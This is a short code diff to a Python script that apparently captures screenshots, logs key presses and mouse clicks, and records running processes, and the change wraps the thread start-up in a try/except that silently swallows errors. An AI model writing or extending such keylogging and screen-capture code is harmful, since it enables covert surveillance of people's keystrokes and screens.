@@ -79,11 +79,14 @@ def monitor_processes():
                 uptime = datetime.now() - create_time
                 file.write(f"PID: {pid}, Name: {name}, Create Time: {create_time}, File Location: {file_location}, Uptime: {uptime}\n")
         time.sleep(120)
-screenshot_thread = threading.Thread(target=capture_screenshot)
-key_logs_thread = threading.Thread(target=log_key_presses)
-mouse_logs_thread = threading.Thread(target=log_mouse_clicks)
-process_monitor_thread = threading.Thread(target=monitor_processes)
-screenshot_thread.start()
-key_logs_thread.start()
-mouse_logs_thread.start()
-process_monitor_thread.start()
+try:
+    screenshot_thread = threading.Thread(target=capture_screenshot)
+    key_logs_thread = threading.Thread(target=log_key_presses)
+    mouse_logs_thread = threading.Thread(target=log_mouse_clicks)
+    process_monitor_thread = threading.Thread(target=monitor_processes)
+    screenshot_thread.start()
+    key_logs_thread.start()
+    mouse_logs_thread.start()
+    process_monitor_thread.start()
+except Exception as e:
+    pass
